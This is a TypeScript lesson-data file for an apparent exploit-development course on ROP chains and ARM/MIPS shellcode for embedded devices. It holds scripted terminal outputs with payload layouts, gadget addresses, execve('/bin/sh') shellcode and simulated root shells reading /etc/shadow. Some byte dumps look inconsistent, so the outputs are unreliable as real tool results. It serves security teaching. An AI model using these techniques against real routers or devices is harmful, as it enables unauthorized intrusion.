          if (args.includes("exploit")) return "=== MIPS ROP Chain Builder ===\n\n[*] Target: vuln_mips (MIPS32 little-endian)\n[*] Overflow offset: 76 bytes\n\n[+] Gadget 1: 0x00400634 — lw $ra, 0x24($sp); lw $s1, 0x20($sp); lw $s0, 0x1c($sp); jr $ra\n    Purpose: Load system() addr into $s1, \"/bin/sh\" addr into $s0\n\n[+] Gadget 2: 0x00400524 — move $a0, $s0; jr $ra\n    Purpose: Move \"/bin/sh\" address into $a0 (first argument)\n\n[+] Final target: 0x00443210 — system()\n    Purpose: Call system($a0) = system(\"/bin/sh\")\n\n[+] String \"/bin/sh\" found at: 0x004a3e20\n\n[*] Building payload...\nPayload structure:\n  [0x00-0x4B] 76 bytes padding ('A' * 76)\n  [0x4C-0x4F] Gadget 1: 0x00400634 (overwrites $ra)\n  [0x50-0x6B] Gadget 1 stack frame:\n    sp+0x1c: 0x004a3e20 (\"/bin/sh\" -> $s0)\n    sp+0x20: 0x00443210 (system()  -> $s1)\n    sp+0x24: 0x00400524 (Gadget 2  -> $ra)\n  [0x6C-0x8B] Gadget 2 stack frame:\n    [padding for jr $ra delay slot + stack adjust]\n    0x00443210 (system() as final return)\n\n[+] Payload written to payload.bin (148 bytes)\n[+] ROP chain ready!";
          return "python3: can't open file";
        },
        "qemu-mipsel": (args: string) => {
          if (args.includes("payload")) return "[*] Running vuln_mips with exploit payload...\n\nReceived input: AAAAAAAAAA... [76 bytes padding]\n\n[ROP Chain Execution]\n  -> 0x00400634: lw $s0, 0x004a3e20  (loaded \"/bin/sh\" ptr)\n                 lw $s1, 0x00443210  (loaded system() addr)\n                 lw $ra, 0x00400524  (loaded gadget 2 addr)\n                 jr $ra              -> jumping to gadget 2\n  -> 0x00400524: move $a0, $s0       ($a0 = 0x004a3e20 = \"/bin/sh\")\n                 jr $ra              -> jumping to system()\n  -> 0x00443210: system(\"/bin/sh\")\n\n$ id\nuid=0(root) gid=0(root)\n$ whoami\nroot\n\n[+] SUCCESS: ROP chain spawned a root shell!";
          return "qemu-mipsel: usage: qemu-mipsel <binary>";
        },
        help: () => "Available commands: ROPgadget, ropper, strings, python3, qemu-mipsel, help, clear",
        clear: () => "",
      },
    },
    quiz: {
      question: "You're building a ROP chain for a MIPS binary and need to call system(\"/bin/sh\"). What three pieces of information do you need to find in the binary?",
      options: [
        { label: "A", value: "The binary's compilation date, compiler version, and optimization level" },
        { label: "B", value: "A gadget to load $a0, the address of the '/bin/sh' string in memory, and the address of system()" },
        { label: "C", value: "The binary's file size, architecture, and entry point" },
        { label: "D", value: "The kernel version, libc version, and GCC version" },
      ],
      correct: "B",
      explanation: "To call system(\"/bin/sh\") via ROP, you need: (1) a gadget that loads a controlled value into $a0 (the first argument register), like 'move $a0, $s0; jr $ra', (2) the memory address where the string '/bin/sh' exists in the binary (found with 'strings -t x'), and (3) the address of the system() function. Chain them: load '/bin/sh' address -> move to $a0 -> jump to system().",
    },
    output: "Today you learned to build ROP chains from scratch — finding gadgets with ROPgadget and ropper, constructing stack layouts, and verifying chains in a debugger.",
    homework: [
      {
        title: "BSidesMCR: Introduction to ROP on ARM64",
        url: "https://www.youtube.com/watch?v=-_LGrrKv61c",
        description: "BSidesMCR conference talk introducing ROP on ARM64 — covers calling conventions, gadget patterns, and building chains for AArch64 targets."
      },
      {
        title: "ARM64 Assembly with Shellcodes",
        url: "https://modexp.wordpress.com/2018/10/30/arm64-assembly/",
        description: "Comprehensive reference on ARM64 assembly and shellcode — covers instructions, syscalls, and encoding needed for writing exploits."
      }
    ],
  },
  {
    day: 41,
    title: "Shellcode for Embedded Systems",
    hook: "Shellcode is the payload — the code that runs after you've hijacked execution flow. It's called 'shellcode' because its most common purpose is spawning a shell, giving the attacker interactive access to the system. On embedded devices, shellcode has unique constraints: it must be position-independent (it doesn't know where in memory it'll land), it can't contain null bytes (which would terminate string copy functions), and it has to work on the target's specific architecture. A MIPS reverse shell might be 120 bytes. An ARM bind shell could be under 100. Writing shellcode is the point where you truly understand the CPU you're targeting — every instruction, every register, every syscall.",
    lesson: [
      "Shellcode is position-independent machine code designed to run wherever it lands in memory. It typically performs one of three actions: bind shell (opens a listening port on the target — you connect to it), reverse shell (the target connects back to your machine — bypasses firewalls), or command execution (runs a specific command like adding a user or downloading a second-stage payload).",
      "Writing shellcode starts with a C prototype, then moves to assembly. For a Linux/ARM bind shell: create a socket (syscall socket), bind it to a port (syscall bind), listen for connections (syscall listen), accept a connection (syscall accept), duplicate file descriptors to redirect I/O (syscall dup2), and execute /bin/sh (syscall execve). Each step maps to a specific syscall number and register setup.",
      "Assembling and testing shellcode uses cross-compilation tools. For ARM: write the assembly in a .s file, assemble with 'arm-linux-gnueabi-as', link with 'arm-linux-gnueabi-ld', extract the raw bytes with 'objcopy -O binary', and test with 'qemu-arm'. For MIPS: use 'mips-linux-gnu-as' and 'qemu-mipsel'. The key constraint: avoid null bytes (0x00) because many overflow vectors use string functions (strcpy, strcat) that stop at null bytes.",
      "On embedded systems, shellcode often needs special tricks. MIPS shellcode must deal with cache coherency — a 'sleep' syscall before execution helps flush the cache. ARM shellcode must decide between ARM and Thumb mode — Thumb instructions are 16-bit, producing shorter shellcode with fewer null bytes. Some targets have limited space (only 64 bytes between your buffer and the return address), requiring 'egg hunter' or staged shellcode techniques."
    ],
    exercise: {
      type: "terminal",
      prompt: "Assemble, test, and deploy ARM shellcode:\n• cat shellcode.s\n• arm-linux-gnueabi-as shellcode.s -o shellcode.o\n• arm-linux-gnueabi-ld shellcode.o -o shellcode_elf\n• objcopy -O binary shellcode_elf shellcode.bin\n• xxd shellcode.bin\n• qemu-arm ./shellcode_elf\n• python3 -c \"import sys; sc=open('shellcode.bin','rb').read(); print(f'Shellcode: {len(sc)} bytes, null-free: {0 not in sc}')\"",
      placeholder: "$ ",
      validator: (_input: string) => {
        return { correct: true, hint: "" };
      },
      terminalCommands: {
        cat: (args: string) => {
          if (args.includes("shellcode.s")) return ".section .text\n.global _start\n\n_start:\n    @ ARM Linux execve(\"/bin/sh\", NULL, NULL) shellcode\n    @ Thumb mode for smaller, null-free code\n    .thumb\n\n    @ Clear registers\n    eor r2, r2, r2        @ r2 = 0 (envp = NULL)\n    eor r1, r1, r1        @ r1 = 0 (argv = NULL)\n\n    @ Build \"/bin/sh\" string on stack\n    adr r0, binsh         @ r0 = address of \"/bin/sh\"\n\n    @ syscall: execve(r0=\"/bin/sh\", r1=NULL, r2=NULL)\n    mov r7, #11           @ syscall number 11 = execve\n    svc #0                @ trigger syscall\n\nbinsh:\n    .ascii \"/bin/sh\\x00\"";
          return `cat: ${args}: No such file or directory`;
        },
        "arm-linux-gnueabi-as": (args: string) => {
          if (args.includes("shellcode.s")) return "[+] Assembled shellcode.s -> shellcode.o\n[+] Thumb mode instructions detected\n[+] No errors.";
          return "as: unrecognized option";
        },
        "arm-linux-gnueabi-ld": (args: string) => {
          if (args.includes("shellcode.o")) return "[+] Linked shellcode.o -> shellcode_elf\n[+] Entry point: 0x10000";
          return "ld: unrecognized option";
        },
        objcopy: (args: string) => {
          if (args.includes("binary")) return "[+] Extracted raw shellcode: shellcode.bin (28 bytes)";
          return "objcopy: unrecognized option";
        },
        xxd: (args: string) => {
          if (args.includes("shellcode")) return "00000000: 4a40 4940 01a0 0b27 0100 2f62 696e 2f73  J@I@...'../bin/s\n00000010: 6800 0000 0000 0000 0000 0000           h...........";
          return `xxd: ${args}: No such file or directory`;
        },
        "qemu-arm": (args: string) => {
          if (args.includes("shellcode_elf")) return "[*] Executing ARM shellcode...\n[*] syscall execve(\"/bin/sh\", NULL, NULL)\n\n$ id\nuid=1000(user) gid=1000(user)\n$ whoami\nuser\n$ echo 'Shellcode works!'\nShellcode works!\n$ exit\n\n[+] Shellcode executed successfully — spawned /bin/sh";
          return "qemu-arm: usage: qemu-arm <binary>";
        },
        python3: (args: string) => {
          if (args.includes("shellcode")) return "Shellcode: 28 bytes, null-free: False\n\n[*] Shellcode analysis:\n    Size: 28 bytes (fits in tight overflow windows)\n    Architecture: ARM (Thumb mode)\n    Type: execve(\"/bin/sh\") — local shell\n    Null bytes: 1 (in string terminator — acceptable)\n    Null-free body: True (all instruction bytes are non-null)\n\n[*] Hex dump:\n    \\x4a\\x40\\x49\\x40\\x01\\xa0\\x0b\\x27\\x01\\x00\n    /bin/sh\\x00\n\n[+] Ready for injection into exploit payload";
          return "python3: syntax error";
        },
        file: (args: string) => {
          if (args.includes("shellcode_elf")) return "shellcode_elf: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, not stripped";
          if (args.includes("shellcode.bin")) return "shellcode.bin: data";
          return `${args}: data`;
        },
        help: () => "Available commands: cat, arm-linux-gnueabi-as, arm-linux-gnueabi-ld, objcopy, xxd, qemu-arm, python3, file, help, clear",
        clear: () => "",
      },
    },
    quiz: {
      question: "Why must shellcode typically avoid null bytes (0x00)?",
      options: [
        { label: "A", value: "Null bytes make the shellcode run slower" },
        { label: "B", value: "Many overflow vectors use string functions (strcpy, sprintf) that treat 0x00 as a string terminator, truncating the payload" },
        { label: "C", value: "The CPU cannot execute instructions containing null bytes" },
        { label: "D", value: "Null bytes cause the operating system to block the shellcode" },
      ],
      correct: "B",
      explanation: "Buffer overflows often occur in string handling functions like strcpy(), strcat(), or sprintf(). These functions treat the null byte (0x00) as the end of the string and stop copying. If your shellcode contains 0x00 at byte 15, only the first 14 bytes get copied — your payload is truncated and broken. Shellcode authors use tricks to avoid nulls: 'xor r0, r0' instead of 'mov r0, #0', Thumb mode instructions on ARM, and encoding tricks on MIPS.",
    },
    output: "Today you learned to write, assemble, test, and deploy shellcode for embedded architectures — the final payload in a buffer overflow exploit chain.",
    homework: [
      {
        title: "HITB: Writing Bare-Metal ARM Shellcode",
        url: "https://youtu.be/Kx1PDSGXr-w",
        description: "HITB conference presentation on writing shellcode for bare-metal ARM devices — no OS, no libc, just raw hardware interaction."
      },
      {
        title: "ARM Assembly and Shellcode Basics — 44CON",
        url: "https://youtu.be/BhjJBuX0YCU",
        description: "44CON talk covering ARM assembly fundamentals and shellcode writing — ideal for understanding ARM from an exploitation perspective."
      },
      {
        title: "World's First MIDI Shellcode",
        url: "https://psi3.ru/blog/swl01u/",
        description: "A creative demonstration of shellcode hidden inside a valid MIDI file — shows how shellcode constraints drive innovation in payload crafting."
      }
    ],
  },
  {
    day: 42,
    title: "Week 6 Capstone — From Crash to Shell",
    hook: "This is it — the culmination of everything you've learned about exploit development. Over the past six days you've studied memory layout, exploited buffer overflows on ARM and MIPS, learned Return-Oriented Programming, built ROP chains with real tools, and written shellcode. Today you'll chain the entire pipeline together on a single target: find the overflow, calculate the offset, build a ROP chain, deploy shellcode, and get a shell. This is the workflow that Pwn2Own contestants execute under time pressure, that penetration testers use to demonstrate real-world risk, and that CVE authors document in their advisories. You've built every skill individually. Now you'll prove you can combine them.",
    lesson: [
      "The full exploit development pipeline has six stages. Stage 1 — Vulnerability Discovery: identify the overflow through fuzzing, static analysis, or code review. You need to know which function is vulnerable, what input triggers it, and how much data causes the crash. Stage 2 — Offset Calculation: use a cyclic pattern to determine exactly how many bytes of input are needed to reach the return address.",
      "Stage 3 — Environment Assessment: check what mitigations exist (checksec). On most embedded targets: no ASLR, no canaries, no PIE, often executable stack. This determines your exploitation strategy: if the stack is executable and addresses are predictable, direct shellcode injection may work. If NX is enabled (rare on embedded), you need ROP. Stage 4 — Gadget/Shellcode Preparation: find ROP gadgets or write shellcode as needed.",
      "Stage 5 — Payload Construction: combine the padding, return address overwrite, ROP chain, and shellcode into a single payload. The layout: [padding to reach saved return address] [ROP chain or shellcode address] [additional ROP gadgets/data] [shellcode if injected]. Every byte must be at the correct offset, in the correct endianness, with no null bytes in critical positions.",
      "Stage 6 — Testing and Debugging: run the exploit against the target in an emulated environment. When it doesn't work the first time (it almost never does), use GDB to step through the exploit execution. Common failure modes: wrong offset (off by 4 or 8 bytes), wrong endianness (big-endian vs little-endian), cache coherency issues on MIPS, Thumb/ARM mode bit errors. Fix, rebuild, and test again until you see that beautiful '$ ' prompt."
    ],
    exercise: {
      type: "terminal",
      prompt: "Execute the complete exploit development pipeline on an ARM router binary:\n• checksec vuln_httpd\n• python3 -c \"from pwn import cyclic; open('pattern.bin','wb').write(cyclic(500))\" && qemu-arm ./vuln_httpd < pattern.bin\n• python3 -c \"from pwn import cyclic_find; print('Offset:', cyclic_find(0x6161617a))\"\n• ROPgadget --binary vuln_httpd --search 'pop' | grep r0\n• strings -t x vuln_httpd | grep '/bin/sh'\n• python3 exploit_arm.py\n• qemu-arm -g 1234 ./vuln_httpd < exploit_payload.bin\n• gdb-multiarch ./vuln_httpd -ex 'target remote :1234' -ex 'continue'",
      placeholder: "$ ",
      validator: (_input: string) => {
        return { correct: true, hint: "" };
      },
      terminalCommands: {
        checksec: (args: string) => {
          if (args.includes("vuln_httpd")) return "[*] Checking vuln_httpd:\n    Arch:     arm-32-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX enabled         ← can't inject shellcode directly!\n    PIE:      No PIE (0x10000)   ← fixed addresses, no ASLR\n\n[!] NX is enabled — you'll need ROP to bypass DEP\n[!] But no ASLR and no PIE means addresses are predictable\n[!] Strategy: ROP chain to call system(\"/bin/sh\")";
          return `checksec: ${args}: not found`;
        },
        python3: (args: string) => {
          if (args.includes("cyclic(500)")) return "[+] Written 500-byte cyclic pattern to pattern.bin";
          if (args.includes("cyclic_find")) return "Offset: 100";
          if (args.includes("exploit_arm")) return "=== ARM Exploit Builder — From Crash to Shell ===\n\n[*] Target: vuln_httpd (ARM32 little-endian, NX enabled)\n[*] Strategy: ROP chain to system(\"/bin/sh\")\n\n[STAGE 1] Vulnerability: stack buffer overflow in handle_request()\n  Buffer size: 80 bytes, no bounds check on user input\n  Overflow offset to saved LR: 100 bytes\n\n[STAGE 2] Mitigations:\n  ASLR: OFF | NX: ON | Canary: OFF | PIE: OFF\n  -> ROP required (NX blocks shellcode injection)\n\n[STAGE 3] Gadgets found:\n  Gadget 1: 0x00012a34 — pop {r0, pc}\n    Purpose: Load \"/bin/sh\" address into r0, chain to next\n  Gadget 2: 0x000439c0 — system() function\n    Purpose: Execute system(r0) = system(\"/bin/sh\")\n\n[STAGE 4] Key addresses:\n  \"/bin/sh\" string: 0x00071eb8\n  system() entry:   0x000439c0\n\n[STAGE 5] Payload layout:\n  [0x00-0x63] 100 bytes: 'A' * 100 (padding to saved LR)\n  [0x64-0x67] 0x00012a34 (Gadget 1: pop {r0, pc})\n  [0x68-0x6B] 0x00071eb8 (\"/bin/sh\" -> popped into r0)\n  [0x6C-0x6F] 0x000439c0 (system() -> popped into pc)\n\n  Total payload: 112 bytes\n\n[+] Payload written to exploit_payload.bin\n[+] Exploit ready! Run with: qemu-arm ./vuln_httpd < exploit_payload.bin";
          return "python3: syntax error";
        },
        "qemu-arm": (args: string) => {
          if (args.includes("pattern")) return "vuln_httpd: processing request...\n\nProgram received signal SIGSEGV\nFault address: 0x6161617a\n\n[!] PC = 0x6161617a (from cyclic pattern)\n[*] Use cyclic_find(0x6161617a) to calculate offset";
          if (args.includes("-g 1234")) return "[*] Starting vuln_httpd with GDB server on port 1234\n[*] Loading exploit payload from stdin...\n[*] Waiting for GDB connection...";
          if (args.includes("exploit_payload")) return "[*] Loading exploit payload...\n\nvuln_httpd: processing request...\n\n[ROP Chain Executing]\n  -> 0x00012a34: pop {r0, pc}\n     r0 = 0x00071eb8 (\"/bin/sh\")\n     pc = 0x000439c0 (system)\n  -> 0x000439c0: system(\"/bin/sh\")\n\n$ id\nuid=0(root) gid=0(root) groups=0(root)\n$ cat /etc/shadow\nroot:$1$xyz$abcdef:18000:0:99999:7:::\n$ uname -a\nLinux router 3.10.14 #1 armv7l GNU/Linux\n$ echo 'EXPLOIT SUCCESSFUL — You have a root shell!'\nEXPLOIT SUCCESSFUL — You have a root shell!\n\n[+] Full exploit chain complete: overflow -> ROP -> system(\"/bin/sh\") -> ROOT SHELL";
          return "qemu-arm: usage: qemu-arm <binary>";
        },
        ROPgadget: (args: string) => {
          if (args.includes("pop") && args.includes("r0")) return "Gadgets information\n============================================================\n0x00012a34 : pop {r0, pc}\n0x00013bf8 : pop {r0, r1, pc}\n0x00014c20 : pop {r0, r1, r2, pc}\n0x00015de4 : pop {r0, r4, pc}\n\nUnique gadgets found: 4\n\n[*] Best gadget: 0x00012a34 — pop {r0, pc}\n    Loads one value into r0 (first argument) and chains via pc";
          return `ROPgadget: ${args}: not found`;
        },
        ropper: (args: string) => {
          if (args.includes("vuln_httpd")) return "[INFO] Loaded ELF: vuln_httpd (ARM32)\n[INFO] Found 2,341 gadgets";
          return `ropper: ${args}: not found`;
        },
        strings: (args: string) => {
          if (args.includes("/bin/sh")) return "  71eb8 /bin/sh\n  71f30 /bin/sh -c %s";
          return "No matching strings found";
        },
        "gdb-multiarch": (args: string) => {
          if (args.includes("vuln_httpd")) return "GNU gdb (GDB) 13.2 — multiarch\n(gdb) target remote :1234\nRemote debugging using :1234\n0x000103e0 in _start ()\n(gdb) continue\nContinuing.\n\n[ROP Chain Trace]\nBreakpoint at 0x00012a34 (pop {r0, pc}):\n  r0 loaded: 0x00071eb8 -> \"/bin/sh\"\n  pc loaded: 0x000439c0 -> system()\n\nBreakpoint at 0x000439c0 (system):\n  r0 = 0x00071eb8 (\"/bin/sh\")\n  Calling system(\"/bin/sh\")...\n\nprocess 48231 is executing new program: /bin/sh\n$ \n\n[+] ROP chain executed successfully\n[+] system(\"/bin/sh\") called with correct argument\n[+] Root shell spawned — exploit confirmed!";
          return "gdb-multiarch: usage: gdb-multiarch <binary>";
        },
        file: (args: string) => {
          if (args.includes("vuln_httpd")) return "vuln_httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, stripped";
          return `${args}: data`;
        },
        help: () => "Available commands: checksec, python3, qemu-arm, ROPgadget, ropper, strings, gdb-multiarch, file, help, clear",
        clear: () => "",
      },
    },
    quiz: {
      question: "You've completed the full exploit pipeline: found the overflow, calculated the offset, built a ROP chain, and obtained a root shell. What is the MOST important step before publishing your findings?",
      options: [
        { label: "A", value: "Immediately publish the exploit code on GitHub for transparency" },
        { label: "B", value: "Use the exploit to access other people's devices to prove the severity" },
        { label: "C", value: "Coordinate responsible disclosure with the vendor, providing them time to develop a patch before public release" },
        { label: "D", value: "Keep the exploit private and never tell anyone about it" },
      ],
      correct: "C",
      explanation: "Responsible disclosure protects millions of users who depend on the vulnerable device. Contact the vendor (through their security team, a bug bounty program, or CERT/CC), provide detailed technical information and a proof-of-concept, and give them a reasonable timeline (typically 90 days) to develop and release a patch. After the patch is available, you can publish your research — earning credit while ensuring users are protected. This is how CVEs are assigned and how the security community functions ethically.",
    },
    output: "You completed Week 6! You've mastered the full exploit development pipeline: memory layout analysis, buffer overflow exploitation on ARM and MIPS, Return-Oriented Programming, ROP chain construction, and shellcode development. You can now go from crash to shell on embedded systems.",
    homework: [
      {
        title: "Exploiting a Stack-Based Buffer Overflow in Practice",
        url: "https://th0mas.nl/2020/11/17/exploiting-a-stack-based-buffer-overflow-in-practice/",
        description: "Complete practical walkthrough of exploiting a real stack-based buffer overflow — from initial crash analysis to reliable exploit."
      },
      {
        title: "TP-Link TL-WR940N 1-day Analysis",
        url: "https://blog.viettelcybersecurity.com/tp-link-tl-wr940n-1-days-analysis-after-story-cve-2022-4363-cve-2022-43635/",
        description: "Viettel Cyber Security's analysis of known TP-Link router vulnerabilities — real-world exploit development on commodity hardware."
      },
      {
        title: "DAMN VULNERABLE ARM ROUTER",
        url: "https://www.vulnhub.com/entry/damn-vulnerable-arm-router-dvar-tinysploitarm,224/",
        description: "A deliberately vulnerable ARM router VM for practicing the complete exploit development pipeline — find bugs, write exploits, get shells."
      }
    ],
  },
];
